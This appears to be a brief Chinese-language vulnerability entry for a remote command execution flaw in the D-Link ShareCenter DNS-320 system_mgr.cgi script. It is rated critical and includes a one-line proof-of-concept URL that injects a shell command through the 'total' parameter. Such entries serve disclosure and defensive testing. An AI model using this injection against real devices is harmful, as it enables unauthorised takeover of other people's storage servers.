# D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞

## 漏洞描述
D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202162224540.png)

漏洞POC为

```plain
/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
```

